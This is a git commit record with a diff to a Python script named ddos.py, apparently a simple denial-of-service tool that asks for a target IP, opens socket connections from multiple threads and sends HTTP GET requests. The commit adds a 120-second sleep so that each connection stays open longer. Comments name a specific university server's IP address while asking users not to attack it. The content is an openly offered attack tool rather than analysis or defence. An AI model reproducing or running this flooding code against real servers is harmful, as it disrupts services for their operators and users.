900e9de8861b9ad137311454b79ae82a456d1e44
Wizard <codewizard001@gmail.com>
2021-02-17 08:34:52 -0500

    Persistant Branch Added

--- ddos.py
+++ ddos.py
@@ -1,8 +1,9 @@
 #just in case you are using it for eduserver or something please dont
 #eduserver IP address = 103.241.136.151
 
-import socket
 import threading
+import socket
+import time
 
 print("\n\n\n Dont try this on eduserver or nitc.ac.in please :) \n\n\n ")
 target = str(input("Target IP : "))
@@ -15,6 +16,7 @@ def attack():
         s.connect((target,port))
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target,port))
         s.sendto(("Host: " + host + "\r\n\r\n").encode('ascii'), (target,port))
+        time.sleep(120)
         s.close()
 
 #threads
